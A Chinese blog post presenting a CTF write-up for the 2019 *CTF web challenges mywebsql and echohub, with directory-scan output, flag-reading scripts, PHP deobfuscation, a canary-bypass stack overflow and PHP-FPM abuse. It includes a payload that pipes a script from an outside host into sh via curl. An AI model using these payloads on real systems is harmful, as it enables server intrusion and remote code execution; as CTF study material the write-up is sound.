<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="0x00 前言这次的题目真的让我学了好久，哈哈 环境部署：1234docker build -t echohub:lastest .docker run -p 10080:80 -tid echohub# 进入容器执行命令docker exec -it suspicious_noether /bin/bash 0x01 WEB1. mywebsql信息收集：12345678910111213141">
<meta property="og:type" content="article">
<meta property="og:title" content="2019 starctf writeup">
<meta property="og:url" content="http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/index.html">
<meta property="og:site_name" content="Z3R0YU">
<meta property="og:description" content="0x00 前言这次的题目真的让我学了好久，哈哈 环境部署：1234docker build -t echohub:lastest .docker run -p 10080:80 -tid echohub# 进入容器执行命令docker exec -it suspicious_noether /bin/bash 0x01 WEB1. mywebsql信息收集：12345678910111213141">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.loli.net/2019/09/15/JXUqS5pBEOsPben.png">
<meta property="og:image" content="https://i.loli.net/2019/09/15/9VxGJh7HoBjg4iS.png">
<meta property="og:image" content="https://i.loli.net/2019/09/15/BOgRCjHeoE92Wb5.png">
<meta property="og:image" content="https://i.loli.net/2019/09/15/T1F49IzKfStcaqM.png">
<meta property="og:image" content="https://i.imgur.com/yCKELtI.png">
<meta property="og:image" content="https://i.loli.net/2019/09/15/dLNRmZKgFBSw4p1.png">
<meta property="og:image" content="https://i.imgur.com/2isT1nn.png">
<meta property="og:updated_time" content="2019-09-14T16:09:46.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2019 starctf writeup">
<meta name="twitter:description" content="0x00 前言这次的题目真的让我学了好久，哈哈 环境部署：1234docker build -t echohub:lastest .docker run -p 10080:80 -tid echohub# 进入容器执行命令docker exec -it suspicious_noether /bin/bash 0x01 WEB1. mywebsql信息收集：12345678910111213141">
<meta name="twitter:image" content="https://i.loli.net/2019/09/15/JXUqS5pBEOsPben.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>2019 starctf writeup</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml">
    
</head>

<body class="max-width mx-auto px3 ltr">    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/06/04/Code-breaking-Puzzles-2018-Note/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/09/14/2019-rctf-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&text=2019 starctf writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&title=2019 starctf writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&is_video=false&description=2019 starctf writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2019 starctf writeup&body=Check out this article: http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&title=2019 starctf writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&title=2019 starctf writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&title=2019 starctf writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&title=2019 starctf writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&name=2019 starctf writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-WEB"><span class="toc-number">2.</span> <span class="toc-text">0x01 WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-mywebsql"><span class="toc-number">2.1.</span> <span class="toc-text">1. mywebsql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-echohub"><span class="toc-number">2.2.</span> <span class="toc-text">2. echohub</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0-代码解密-amp-源代码描述的栈情况解读"><span class="toc-number">2.2.1.</span> <span class="toc-text">0. 代码解密&amp;源代码描述的栈情况解读</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-防护绕过-amp-栈溢出"><span class="toc-number">2.2.2.</span> <span class="toc-text">1. 防护绕过&amp;栈溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-代码注入"><span class="toc-number">2.2.3.</span> <span class="toc-text">2. 代码注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-攻击fpm"><span class="toc-number">2.2.4.</span> <span class="toc-text">3. 攻击fpm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-EXP"><span class="toc-number">2.2.5.</span> <span class="toc-text">5. EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-参考"><span class="toc-number">2.2.6.</span> <span class="toc-text">6.参考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-996game"><span class="toc-number">2.3.</span> <span class="toc-text">3. 996game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#OrZ"><span class="toc-number">2.3.1.</span> <span class="toc-text">OrZ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup"><span class="toc-number">2.3.2.</span> <span class="toc-text">writeup</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        2019 starctf writeup
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Z3R0YU</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-09-14T16:07:18.000Z" itemprop="datePublished">2019-09-15</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这次的题目真的让我学了好久，哈哈</p>
<p>环境部署：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t echohub:lastest .</span><br><span class="line">docker run -p 10080:80 -tid echohub</span><br><span class="line"># 进入容器执行命令</span><br><span class="line">docker exec -it suspicious_noether /bin/bash</span><br></pre></td></tr></table></figure></p>
<h2 id="0x01-WEB"><a href="#0x01-WEB" class="headerlink" title="0x01 WEB"></a>0x01 WEB</h2><h3 id="1-mywebsql"><a href="#1-mywebsql" class="headerlink" title="1. mywebsql"></a>1. mywebsql</h3><p>信息收集：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[09:42:18] 200 -    1KB - /README.md</span><br><span class="line">[09:42:51] 301 -  323B  - /backups  -&gt;  http://34.92.36.201:10080/backups/</span><br><span class="line">[09:42:52] 200 -    3KB - /backups/</span><br><span class="line">[09:42:59] 301 -  322B  - /config  -&gt;  http://34.92.36.201:10080/config/</span><br><span class="line">[09:43:00] 200 -    3KB - /config/</span><br><span class="line">[09:43:12] 200 -    9KB - /favicon.ico</span><br><span class="line">[09:43:19] 301 -  319B  - /img  -&gt;  http://34.92.36.201:10080/img/</span><br><span class="line">[09:43:20] 200 -    6KB - /index.php</span><br><span class="line">[09:43:21] 200 -    6KB - /index.php/login/</span><br><span class="line">[09:43:22] 200 -    6KB - /install.php</span><br><span class="line">[09:43:23] 301 -  318B  - /js  -&gt;  http://34.92.36.201:10080/js/</span><br><span class="line">[09:43:24] 301 -  320B  - /lang  -&gt;  http://34.92.36.201:10080/lang/</span><br><span class="line">[09:43:24] 301 -  319B  - /lib  -&gt;  http://34.92.36.201:10080/lib/</span><br><span class="line">[09:43:31] 301 -  323B  - /modules  -&gt;  http://34.92.36.201:10080/modules/</span><br><span class="line">[09:43:48] 403 -  304B  - /server-status/</span><br><span class="line">[09:43:48] 403 -  303B  - /server-status</span><br><span class="line">[09:43:58] 301 -  322B  - /themes  -&gt;  http://34.92.36.201:10080/themes/</span><br><span class="line">[09:43:58] 301 -  319B  - /tmp  -&gt;  http://34.92.36.201:10080/tmp/</span><br><span class="line">[09:43:58] 200 -  936B  - /tmp/</span><br></pre></td></tr></table></figure></p>
<p>源码:<br><a href="https://github.com/Samnan/MyWebSQL" target="_blank" rel="noopener">https://github.com/Samnan/MyWebSQL</a></p>
<p>导出建表，利用备份功能getshell</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> Expect;</span><br><span class="line">$obj = Expect-&gt;spawn( <span class="string">"./tmp/readflag"</span> );</span><br><span class="line"><span class="comment"># $obj-&gt;exp_internal( 1 );</span></span><br><span class="line">@result&#123; <span class="string">"position"</span>, <span class="string">"error"</span>, <span class="string">"match"</span>, <span class="string">"before"</span>, <span class="string">"after"</span> &#125; =$obj-&gt;expect(<span class="number">1</span>,<span class="string">-re=&gt;</span>qr/\(\(.*\)\)/);</span><br><span class="line"><span class="comment"># print $result&#123;"match"&#125;;</span></span><br><span class="line">$res=<span class="keyword">eval</span>($result&#123;<span class="string">"match"</span>&#125;);</span><br><span class="line"><span class="comment"># print $res;</span></span><br><span class="line">$pos=$obj-&gt;expect(<span class="number">1</span>,</span><br><span class="line">       [ <span class="regexp">qr/input your answer:\s*$/i</span>, </span><br><span class="line">         <span class="function"><span class="keyword">sub</span></span>&#123; <span class="keyword">my</span> $self = <span class="keyword">shift</span>; $self-&gt;<span class="keyword">send</span>( $res.<span class="string">"\r"</span> ); exp_continue;&#125; </span><br><span class="line">       ], </span><br><span class="line">    );</span><br><span class="line"><span class="comment"># print $pos;</span></span><br><span class="line">$obj-&gt;soft_close( );</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/09/15/JXUqS5pBEOsPben.png" alt="65748B37-692A-4809-8794-A714FC111F3F.png"></p>
<p>perl有个pp可以直接打包成二进制程序上传执行得到flag</p>
<p><img src="https://i.loli.net/2019/09/15/9VxGJh7HoBjg4iS.png" alt="屏幕快照 2019-04-28 上午10.00.10.png"></p>
<p>php的话可以利用如下方式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 与二进制程序交互的脚本</span></span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">	<span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>), <span class="comment">// 标准输入，子进程从此管道读取数据</span></span><br><span class="line">	<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>), <span class="comment">//	标准输出，子进程向此管道写入数据</span></span><br><span class="line">	<span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"file"</span>, <span class="string">"/tmp/.a/errer-output.txt"</span>, <span class="string">"a"</span>), <span class="comment">//标准错误，写入到一个文件</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$cwd = <span class="string">'/'</span>;</span><br><span class="line">$env = arrat();</span><br><span class="line"></span><br><span class="line">$proess = proc_open(<span class="string">'/readflag'</span>, $descriptorspec, $pipes, $cwd, $env);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_resource($proess)) &#123;</span><br><span class="line">	$a = fread($pipes[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">	$a = fread($pipes[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">	$a = explode(<span class="string">"\n"</span>, $a);</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">"\$result=$a[0];"</span>);</span><br><span class="line">	<span class="keyword">echo</span> (<span class="string">"\$result=$a[0];"</span>);</span><br><span class="line"></span><br><span class="line">	fwrite($pipes[<span class="number">0</span>], <span class="string">"$result\n"</span>);</span><br><span class="line"></span><br><span class="line">	var_dump(fread($pipes[<span class="number">1</span>], <span class="number">1024</span>));</span><br><span class="line">	var_dump(fread($pipes[<span class="number">1</span>], <span class="number">1024</span>));</span><br><span class="line">	var_dump(fread($pipes[<span class="number">1</span>], <span class="number">1024</span>));</span><br><span class="line"></span><br><span class="line">	fclose($pipes[<span class="number">0</span>]);</span><br><span class="line">	fclose($pipes[<span class="number">1</span>]);</span><br><span class="line">	$return_value = proc_close($proess);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"command returned $return_value\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>官方使用如下perl脚本进行解答<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3(\*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span>) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line"></span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r=<span class="keyword">eval</span> <span class="string">"$r"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">"$r\n"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br></pre></td></tr></table></figure></p>
<h3 id="2-echohub"><a href="#2-echohub" class="headerlink" title="2. echohub"></a>2. echohub</h3><h4 id="0-代码解密-amp-源代码描述的栈情况解读"><a href="#0-代码解密-amp-源代码描述的栈情况解读" class="headerlink" title="0. 代码解密&amp;源代码描述的栈情况解读"></a>0. 代码解密&amp;源代码描述的栈情况解读</h4><ol>
<li>这个base64编码的脚本中是含有脏数据的和一些特殊字符的，直接使用编辑器编辑可能会有一些问题，所以我在此先使用脚本将其解码之后使用二进制编辑器010editor进行编辑</li>
</ol>
<p>脚本如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &apos;base64_encode_phpcode_value&apos; | base64 -D &gt; ./log</span><br></pre></td></tr></table></figure></p>
<p>使用010editor打开</p>
<p><img src="https://i.loli.net/2019/09/15/BOgRCjHeoE92Wb5.png" alt="212B5D86-CE77-4CAE-B610-E183EBE9FAB2.png"></p>
<ol start="2">
<li>在010editor编辑器中手动删除一下脏数据</li>
<li>使用phptorm/vscode进行动态调试或者使用<code>var_export</code>来对这里的变量替换表进行分析</li>
</ol>
<p><img src="https://i.loli.net/2019/09/15/T1F49IzKfStcaqM.png" alt="F4897E52-CFD9-4391-9C20-A18CFCF0AB68.png"><br>可以看到对应的变量表，之后写一个脚本来对加密的PHP文件进行处理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'index.php'</span>;	<span class="comment">// index.php为被加密的文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceString</span><span class="params">($match)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $O;</span><br><span class="line">    $index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">false</span> !== strpos($match[<span class="number">1</span>], <span class="string">'x'</span>))&#123;</span><br><span class="line">        $index = hexdec($match[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $index = $match[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( function_exists($O[$index]) || class_exists($O[$index]) || defined($O[$index]) )&#123;</span><br><span class="line">        <span class="keyword">return</span> $O[$index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"'"</span>.addslashes($O[$index]).<span class="string">"'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$encrypto_string = file_get_contents(<span class="string">'index.php'</span>);</span><br><span class="line">$encrypto_string = preg_replace_callback(<span class="string">'/\$GLOBALS[\[\&#123;]O0[\]\&#125;][\[\&#123;](\w&#123;1,15&#125;)[\]\&#125;]/'</span>,<span class="string">'replaceString'</span>,$encrypto_string);</span><br><span class="line">$decrypto_string = preg_replace_callback(<span class="string">'/\$[O0]*[\[\&#123;](\w&#123;2,15&#125;)[\]\&#125;]/'</span>,<span class="string">'replaceString'</span>,$encrypto_string);</span><br><span class="line">file_put_contents(<span class="string">'decrypted.php'</span>, $decrypto_string);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>PS: 此处有个坑点，使用sublime打开010editor处理后的代码是一堆16进制，但是使用vscode打开就问题。</p>
<h4 id="1-防护绕过-amp-栈溢出"><a href="#1-防护绕过-amp-栈溢出" class="headerlink" title="1. 防护绕过&amp;栈溢出"></a>1. 防护绕过&amp;栈溢出</h4><p>无论是aslr和canary的防护都是基于srand()的，而种子是time()，我们只要时区一样，那么本地和目标的time()的结果就是一样的，因而可以预测，进而绕过目标的防护机制。</p>
<p>此处我们的时区和目标主机是一样的，所以我们的time()是一样的，但是如果不一样，我们可以利用如下代码来从phpinfo获取对应的时间种子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line">define(<span class="string">'TARGET'</span>, <span class="string">'http://34.85.27.91:10080/'</span>);</span><br><span class="line"><span class="comment">// init random generator</span></span><br><span class="line">$client = <span class="keyword">new</span> GuzzleHttp\Client();</span><br><span class="line">$res = $client-&gt;request(<span class="string">'POST'</span>, TARGET, [</span><br><span class="line">  <span class="string">'form_params'</span> =&gt; [<span class="string">'data'</span> =&gt; <span class="string">'aaaa'</span>]</span><br><span class="line">]);</span><br><span class="line">preg_match(<span class="string">"/REQUEST_TIME'[^0-9]+(\d+)/"</span>, $res-&gt;getBody(), $matches);</span><br><span class="line">srand((int)$matches[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
<p>栈溢出覆盖之后记得把canary对应的值填上就好了，栈的情况如下</p>
<table>
<thead>
<tr>
<th>7777</th>
<th>POST参数2</th>
</tr>
</thead>
<tbody>
<tr>
<td>6666</td>
<td>POST参数1</td>
</tr>
<tr>
<td>2</td>
<td>参数的数量</td>
</tr>
<tr>
<td>phpinfo地址</td>
<td>ret地址</td>
</tr>
<tr>
<td>EBP</td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td></td>
</tr>
<tr>
<td>AAAAAAA</td>
<td></td>
</tr>
<tr>
<td>DATA:AAA</td>
<td>ESP</td>
</tr>
</tbody>
</table>
<p>因此对应的缓冲区的完整构造如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = str_repeat( <span class="string">'A'</span>, $padding_num ) . hexToStr( strrev( $canarycheck ) ) . <span class="string">"BBBB"</span> . hexToStr( strrev( dechex( $func_[<span class="string">'create_function'</span>] ) ) ) . <span class="string">'000266667777'</span>;</span><br></pre></td></tr></table></figure>
<h4 id="2-代码注入"><a href="#2-代码注入" class="headerlink" title="2. 代码注入"></a>2. 代码注入</h4><blockquote>
<p>参考自：<a href="https://www.exploit-db.com/exploits/32417" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/32417</a></p>
</blockquote>
<p>其实就是使用disable_functions没有包含的<code>create_function</code>进行代码注入造成任意命令执行，但是要注意的是，及时我们可以注入任意代码，但是这样的环境依旧受到disable_functions的制约，造成环境十分受限</p>
<h4 id="3-攻击fpm"><a href="#3-攻击fpm" class="headerlink" title="3. 攻击fpm"></a>3. 攻击fpm</h4><p>为什么要攻击fpm？因为我们通过<code>create_function</code>得到的是一个受限的shell，所以我们要办法突破这个环境的限制</p>
<blockquote>
<p>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。</p>
<p>auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。</p>
<p>那么就有趣了，假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）</p>
</blockquote>
<p>引用自：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">《Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写》</a></p>
<p>之后就是利用这个漏洞老帮助我们执行命令，想要执行的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">'curl http://ebcece08.w1n.pw/getflag | sh'</span>);<span class="keyword">die</span>(<span class="string">'zeroyu'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>getflag的内容如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id;</span><br><span class="line">ls /;</span><br><span class="line">/readflag</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"         "</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'dXNlIHN0cmljdDsKdXNlIElQQzo6T3BlbjM7CgpteSAkcGlkID0gb3BlbjMoXCpDSExEX0lOLCBcKkNITERfT1VULCBcKkNITERfRVJSLCAnL3JlYWRmbGFnJykgb3IgZGllICJvcGVuMygpIGZhaWxlZCAkISI7CgpteSAkcjsKCiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOwokcj1ldmFsICIkciI7CnByaW50ICIkclxuIjsKcHJpbnQgQ0hMRF9JTiAiJHJcbiI7CiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOw=='</span>|base64 -d | perl</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"         "</span>;</span><br></pre></td></tr></table></figure></p>
